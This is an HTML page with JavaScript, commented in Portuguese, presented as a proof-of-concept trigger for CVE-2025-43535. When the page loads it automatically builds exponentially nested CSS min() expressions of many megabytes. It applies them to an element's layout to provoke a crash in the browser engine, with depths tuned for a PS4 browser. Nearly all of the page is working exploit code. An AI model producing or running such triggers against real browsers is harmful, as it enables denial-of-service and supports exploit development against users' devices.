<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>CVE-2025-43535 — V1 Exponential Optimized</title>
<style>
body { background:#0a0a0a; color:#88ff88; font-family:monospace; padding:16px; }
#log { background:#111; border:1px solid #2a4a2a; padding:12px;
       height:65vh; overflow-y:auto; font-size:12px; line-height:1.6; }
.ok{color:#00ff88} .fail{color:#ff4444} .info{color:#ffcc44} .crash{color:#ff00ff;font-weight:bold}
</style>
</head>
<body>

<h3>CVE-2025-43535 — Variante 1 Exponencial Otimizada</h3>
<div id="log"></div>

<script>
"use strict";

const logEl = document.getElementById("log");

function L(msg, cls){
  const d=document.createElement("div");
  d.className=cls||"info";
  d.textContent="["+(Date.now()%100000)+"] "+msg;
  logEl.appendChild(d);
  logEl.scrollTop=logEl.scrollHeight;
}

L("=== V1 Exponential Optimized ===","info");

/*
   Construção exponencial iterativa:
   Cada passo dobra a expressão anterior:
   e = min(e,e)

   Evita recursão profunda JS
   Evita concatenações intermediárias redundantes
*/

function buildExponential(depth){
  let e = "1px";
  for(let i=0;i<depth;i++){
    e = "min(" + e + "," + e + ")";
  }
  return e;
}

async function run(){

  const el=document.createElement("div");
  el.style.cssText="position:absolute;top:-9999px";
  document.body.appendChild(el);

  const sheet=document.createElement("style");
  document.head.appendChild(sheet);

  // Ajuste conforme limite do PS4
  const depths=[20,22,23,24,25,26,27];

  for(const depth of depths){

    try{
      L("Construindo depth="+depth+" ...","info");

      const expr=buildExponential(depth);

      L("Tamanho string ~"+Math.round(expr.length/1024/1024)+" MB","info");

      sheet.textContent=".t{width:"+expr+";height:"+expr+"}";
      el.className="t";

      void el.offsetWidth;

      L("depth="+depth+" OK","ok");

    }catch(e){
      L("depth="+depth+" ERRO: "+e,"fail");
    }

    await new Promise(r=>setTimeout(r,100));
  }

  L("=== FIM ===","ok");
  L("Crash antes disso = possível trigger da CVE-2025-43535","crash");
}

window.addEventListener("load",()=>setTimeout(run,300));
</script>

</body>
</html>
